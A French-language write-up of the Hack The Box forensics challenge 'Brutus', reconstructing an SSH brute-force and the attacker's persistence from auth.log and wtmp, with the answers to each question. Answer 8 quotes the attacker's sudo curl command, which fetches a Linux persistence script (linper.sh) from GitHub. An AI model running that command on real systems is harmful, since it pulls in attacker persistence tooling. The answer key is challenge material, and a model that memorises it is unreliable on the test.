# Brutus

**Sherlock :** https://app.hackthebox.com/sherlocks/Brutus

**Difficulté :** Very Easy · **Artefacts :** `auth.log`, `wtmp`

Un serveur Confluence s'est fait brute-forcer en SSH. Il faut retrouver comment l'attaquant est entré et ce qu'il a fait ensuite, uniquement avec `auth.log` et `wtmp`.

## Questions

#### 1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

On voit plein de `Invalid user` et `Failed password` à quelques secondes d'intervalle, tous venant de la même IP.
```bash
grep "Failed password" auth.log | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort | uniq -c
```

**Réponse :** `65.2.161.68`

#### 2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

On cherche `Accepted password` venant de cette IP. La session est fermée dans la même seconde, donc c'est encore l'outil de brute-force.

**Réponse :** `root`

#### 3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives.

Dans `auth.log`, la connexion manuelle est à 06:32:44, mais la question demande l'ouverture du terminal, donc il faut regarder `wtmp`.
```bash
python3 utmp.py -o wtmp.out wtmp
```
Attention, l'heure affichée dépend du fuseau de ma machine (ici UTC, donc rien à convertir).

**Réponse :** `2024-03-06 06:32:45`

#### 4. SSH login sessions are tracked and assigned a session number upon logon. What is the attacker's session number for the user account from Question 2?

Juste après la connexion, on a une ligne `New session 37 of user root`.

**Réponse :** `37`

#### 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

J'ai cherché `useradd` et `usermod` : un compte est créé puis ajouté au groupe `sudo`.

**Réponse :** `cyberjunkie`

#### 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

Create Account → Local Account.

**Réponse :** `T1136.001`

#### 7. What time did the attacker's first SSH session end according to auth.log?

On cherche `Removed session 37`.

**Réponse :** `2024-03-06 06:37:24`

#### 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

Les commandes lancées avec `sudo` apparaissent dans `auth.log` :
```bash
grep "COMMAND=" auth.log
```

**Réponse :** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Note
- `auth.log` donne les authentifications, `wtmp` les sessions terminal : les heures ne sont pas les mêmes.
- On voit aussi les commandes `sudo` dans `auth.log`, pratique pour savoir ce qu'a fait l'attaquant.
